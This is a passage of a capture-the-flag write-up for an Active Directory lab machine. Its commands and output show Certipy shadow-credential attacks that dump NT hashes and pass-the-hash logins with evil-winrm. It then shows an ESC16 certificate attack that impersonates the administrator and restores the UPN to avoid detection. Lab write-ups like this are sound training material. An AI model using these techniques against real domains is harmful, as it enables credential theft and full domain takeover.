Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:25 DONE (2025-05-26 17:13) 0g/s 168432p/s 505298c/s 505298C/s !!12Honey..*7¡Vamos!
Session completed.
```

Unable to crack :((. Let's go back to the approach we discussed from `0xdf` blog and using [Certipy](https://github.com/ly4k/Certipy) which is the tool for Active Directory Certificate Services enumeration and abuse.

## Privilege Escalation
### Active Directory Certificate Services (AD CS)
Let's use `find` to identify templates and `-vulnerable` to show the vulnerable result only.
```bash
└─$ certipy find -u p.agila -p 'prometheusx-303' -target fluffy.htb -text -stdout -vulnerable 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
Certificate Templates                   : [!] Could not find any certificate templates
```

> Double check to update `certipy` to newest version `v5.0.2`.

As we can see there is not certificate services vulnerable, but when we look back at the bloodhound graph, our user `p.agila` has been added to `SERVICE ACCOUNTS@FLUFFY.HTB` group which has `ca_svc`, `ldap_svc` member and this group also has **GenericWrite** to `winrm_svc` user.

With `certipy`, we can use `shadow credentials` attack to get `NT HASH` from `ca_svc`. Let's start this part first!
```bash
└─$ certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account ca_svc                                        
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '011ed7b6-63d0-3d23-8293-ef54ef0ec4ff'
[*] Adding Key Credential with device ID '011ed7b6-63d0-3d23-8293-ef54ef0ec4ff' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '011ed7b6-63d0-3d23-8293-ef54ef0ec4ff' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

Got the `NT hash` for `ca_svc` so typically, we can grab `NT hash` for `ldap_svc` and even `winrm_svc`.

```bash
└─$ certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'ldap_svc'                                                                                   
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.402 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Targeting user 'ldap_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'c071415b-aafc-32b8-9254-a5803f1a2cba'
[*] Adding Key Credential with device ID 'c071415b-aafc-32b8-9254-a5803f1a2cba' to the Key Credentials for 'ldap_svc'
[*] Successfully added Key Credential with device ID 'c071415b-aafc-32b8-9254-a5803f1a2cba' to the Key Credentials for 'ldap_svc'
[*] Authenticating as 'ldap_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ldap_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ldap_svc.ccache'
[*] Wrote credential cache to 'ldap_svc.ccache'
[*] Trying to retrieve NT hash for 'ldap_svc'
[*] Restoring the old Key Credentials for 'ldap_svc'
[*] Successfully restored the old Key Credentials for 'ldap_svc'
[*] NT hash for 'ldap_svc': 22151d74ba3de931a352cba1f9393a37
```

```bash
└─$ certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'winrm_svc'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'c1c2a112-9013-d861-ccc8-a4e5bfaa77ba'
[*] Adding Key Credential with device ID 'c1c2a112-9013-d861-ccc8-a4e5bfaa77ba' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'c1c2a112-9013-d861-ccc8-a4e5bfaa77ba' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

*During your process, if you can and got this problem:*
```bash
└─$ certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'winrm_svc'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.402 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'fd934af8-0516-f562-b912-1c32ea64e9d2'
[*] Adding Key Credential with device ID 'fd934af8-0516-f562-b912-1c32ea64e9d2' to the Key Credentials for 'winrm_svc'
[-] Could not update Key Credentials for 'winrm_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

&rarr; Just run again the `add groupMember` for `p.agila` and the result will good to go. (In case, update the **timezones** too)

```text
└─$ evil-winrm -i 10.129.55.191 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> dir
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ..
*Evil-WinRM* PS C:\Users\winrm_svc> cd Desktop
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> dir


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/26/2025   9:15 AM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
a387419abea47b342b23c7ddf8403506
```

&rarr; Login in as `winrm_svc` and get the `user.txt` flag.

Now, let's try to get the `root.txt` flag as we need to escalate from `winrm_svc` to `Administrator`.

Back to `certipy` to find the certificate vulnerable from `ca_svc`.
```bash
└─$ certipy find -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target fluffy.htb -text -stdout -vulnerable                 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

Use there is a vulnerability in `ESC16` to exploit the certificate services.

Check out the `wiki` section and found this part [ESC16 - Security Extension is disabled on CA globally](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally).

*From this part: our attack flow is:* <br>
&rarr; `p.agila` → `ca_svc` (Shadow Credentials) → `administrator` (Certificate Attack)

Let's export kerberos ticket of `ca_svc` for authentication.
```bash
└─$ export KRB5CCNAME=ca_svc.ccache
```

```bash
└─$ certipy account -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.55.191 -user 'ca_svc' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-05-26T23:00:24+00:00
```

We read the certificate of `ca_svc` then we will modified `UPN` of `ca_svc` to `administrator`.
```bash
└─$ certipy account -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.55.191 -upn 'administrator' -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

Then request with template `User` because our `UPN` now is `administrator` so the certificate will issue to `administrator`.
```bash
└─$ certipy req -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -target DC01.fluffy.htb -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

After then restore `UPN` original value not to get detected.
```bash
└─$ certipy account -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.55.191 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

Now we can use certificate after created to authenticate as `administrator`.
```bash
└─$ certipy auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip 10.129.55.191
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

Got the `NT hash` of `administrator` and also the kerberos ticket.

Able to login in as `administrator` and get the `root.txt` flag.
```text
└─$ evil-winrm -i 10.129.55.191 -u 'administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'                                 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/26/2025   9:15 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
7a71da4583cb40708af8ed91adc50c1f
```

From this attack, we can see that: <br>
- `ESC16`: Security Extension is disabled → certificate attributes can be manipulated
- `UPN Confusion`: Change the UPN so that the certificate authority thinks it is issuing the cert to the `administrator`
- `Certificate Authority Trust`: The CA trusts the certificate request from the `ca_svc` account

This type of attack is really awesome, a combination of `Shadow Credentials` and `Certificate Services` vulnerabilities.

![result](/assets/img/fluffy-htb-season8/result.png)